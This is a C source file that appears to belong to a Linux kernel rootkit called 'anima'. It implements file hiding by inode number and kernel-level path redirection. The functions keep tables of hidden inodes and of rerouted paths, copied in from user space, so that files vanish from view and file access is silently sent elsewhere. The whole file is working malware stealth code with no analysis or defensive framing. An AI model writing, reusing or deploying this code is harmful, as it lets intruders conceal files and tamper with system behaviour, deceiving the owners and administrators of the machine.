#include <linux/printk.h>

#include <anima/config.h>
#include <anima/hide_file.h>
#include <anima/libc.h>

static u64 hidden_inodes[MAX_HIDDEN_INODES] = {0};

int is_inode_hidden(u64 ino)
{
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i] == ino)
			return 1;
	return 0;
}

void hide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu\n", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
			hidden_inodes[i] = ino;
			break;
		}
	}
}

void unhide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu\n", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_inodes[i] == ino) {
			hidden_inodes[i] = 0;
			break;
		}
	}
}

static struct redirect_path redirect_pathes[MAX_PATH_REDIRECT] = { {0, NULL, 0, NULL, 0} };

char *get_redirect_path(char *old_path, int mode)
{
	for (int i = 0; i < MAX_PATH_REDIRECT; i++) {
		struct redirect_path *r = redirect_pathes + i;
		if (!r->old_path)
			continue;
		if (!anima_strcmp(r->old_path, old_path) && r->mode == mode)
			return r->new_path;
	}

	return NULL;
}

void redirect_path(char *old_path, unsigned int old_path_len,
		   char *new_path, unsigned int new_path_len, int mode)
{
	char *kold_path, *knew_path;

	if (old_path_len > MAX_PATH_LEN)
		old_path_len = MAX_PATH_LEN;
	if (new_path_len > MAX_PATH_LEN)
		new_path_len = MAX_PATH_LEN;

	kold_path = anima_strndup_from_user(old_path, old_path_len);
	if (!kold_path)
		goto out;

	knew_path = anima_strndup_from_user(new_path, new_path_len);
	if (!knew_path)
		goto free_kold_path;

	pr_debug("%s: redirect %s to %s\n", __func__, kold_path, knew_path);

	for (int i = 0; i < MAX_PATH_REDIRECT; i++) {
		struct redirect_path *r = redirect_pathes + i;
		if (!r->old_path) {
			r->mode = mode;
			r->old_path = kold_path;
			r->new_path = knew_path;
			goto out;
		}
	}

	anima_vfree(knew_path);
free_kold_path:
	anima_vfree(kold_path);
out:
	return;
}

void unredirect_path(const char *old_path, unsigned int len, int mode)
{
	char *kold_path;

	if (len > MAX_PATH_LEN)
		len = MAX_PATH_LEN;

	kold_path = anima_strndup_from_user(old_path, len);
	if (!kold_path)
		return;

	pr_debug("%s: unredirect %s\n", __func__, kold_path);

	for (int i = 0; i < MAX_PATH_REDIRECT; i++) {
		struct redirect_path *r = redirect_pathes + i;
		if (!r->old_path)
			continue;
		if (!anima_strcmp(r->old_path, kold_path) && r->mode == mode) {
			anima_vfree(r->old_path);
			anima_vfree(r->new_path);
			r->mode = 0;
			r->old_path = NULL;
			r->new_path = NULL;
		}
	}

	anima_vfree(kold_path);
}

void hide_inode_debug(void)
{
	pr_debug("%s: hidden inodes\n", __func__);
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i])
			pr_debug("\tino=%llu\n", hidden_inodes[i]);
}
